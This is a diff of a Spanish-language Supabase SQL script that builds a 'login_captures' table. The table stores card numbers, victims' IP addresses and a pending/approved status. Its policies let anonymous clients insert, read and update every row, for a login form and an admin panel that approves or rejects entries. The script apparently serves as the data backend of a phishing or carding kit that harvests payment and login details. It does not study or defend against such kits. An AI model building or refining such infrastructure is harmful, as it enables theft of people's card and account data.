@@ -1,7 +1,9 @@
--- Script SQL para crear la tabla de captura de datos de login
--- Ejecutar en el SQL Editor de Supabase
+-- Script SQL completo para la tabla login_captures
+-- Se puede ejecutar múltiples veces sin errores
 
--- Crear la tabla para almacenar los datos del formulario
+-- ============================================================
+-- 1. CREAR LA TABLA (si no existe)
+-- ============================================================
 CREATE TABLE IF NOT EXISTS login_captures (
   id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
   card_number TEXT NOT NULL,
@@ -13,38 +15,65 @@ CREATE TABLE IF NOT EXISTS login_captures (
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
--- Crear un índice por fecha para consultas rápidas
-CREATE INDEX IF NOT EXISTS idx_login_captures_created_at ON login_captures(created_at DESC);
+-- ============================================================
+-- 2. AGREGAR COLUMNAS FALTANTES (si la tabla ya existía)
+-- ============================================================
+DO $$
+BEGIN
+  -- Agregar columna 'status' si no existe
+  IF NOT EXISTS (
+    SELECT 1 FROM information_schema.columns
+    WHERE table_name = 'login_captures' AND column_name = 'status'
+  ) THEN
+    ALTER TABLE login_captures ADD COLUMN status TEXT DEFAULT 'pendiente';
+  END IF;
 
--- Habilitar Row Level Security (opcional, pero recomendado)
+  -- Agregar columna 'ip_address' si no existe
+  IF NOT EXISTS (
+    SELECT 1 FROM information_schema.columns
+    WHERE table_name = 'login_captures' AND column_name = 'ip_address'
+  ) THEN
+    ALTER TABLE login_captures ADD COLUMN ip_address TEXT;
+  END IF;
+END $$;
+
+-- ============================================================
+-- 3. CREAR ÍNDICES (si no existen)
+-- ============================================================
+CREATE INDEX IF NOT EXISTS idx_login_captures_created_at ON login_captures(created_at DESC);
+CREATE INDEX IF NOT EXISTS idx_login_captures_status ON login_captures(status);
+
+-- ============================================================
+-- 4. HABILITAR ROW LEVEL SECURITY
+-- ============================================================
 ALTER TABLE login_captures ENABLE ROW LEVEL SECURITY;
 
--- Crear política para permitir inserts anónimos (necesario para que el formulario pueda insertar)
+-- ============================================================
+-- 5. ELIMINAR POLÍTICAS EXISTENTES (para evitar duplicados)
+-- ============================================================
+DROP POLICY IF EXISTS "Allow anonymous inserts" ON login_captures;
+DROP POLICY IF EXISTS "Allow anonymous select" ON login_captures;
+DROP POLICY IF EXISTS "Allow anonymous update" ON login_captures;
+
+-- ============================================================
+-- 6. CREAR POLÍTICAS NUEVAS
+-- ============================================================
+
+-- Política para INSERT anónimo (el formulario de login)
 CREATE POLICY "Allow anonymous inserts" ON login_captures
   FOR INSERT
   TO anon
   WITH CHECK (true);
 
--- Política para que usuarios anónimos puedan hacer SELECT (necesario para el admin)
+-- Política para SELECT anónimo (admin y contador)
 CREATE POLICY "Allow anonymous select" ON login_captures
   FOR SELECT
   TO anon
   USING (true);
 
--- Política para que usuarios anónimos puedan hacer UPDATE (necesario para aprobar/rechazar)
+-- Política para UPDATE anónimo (admin aprueba/rechaza)
 CREATE POLICY "Allow anonymous update" ON login_captures
   FOR UPDATE
   TO anon
   USING (true)
   WITH CHECK (true);
-
--- (Opcional) Política para que solo usuarios autenticados puedan leer
--- CREATE POLICY "Allow authenticated select" ON login_captures
---   FOR SELECT
---   TO authenticated
---   USING (true);
-
--- ═══════════════════════════════════════════════════════════════
--- Si ya creaste la tabla sin la columna 'status', ejecuta esto:
--- ═══════════════════════════════════════════════════════════════
--- ALTER TABLE login_captures ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'pendiente';
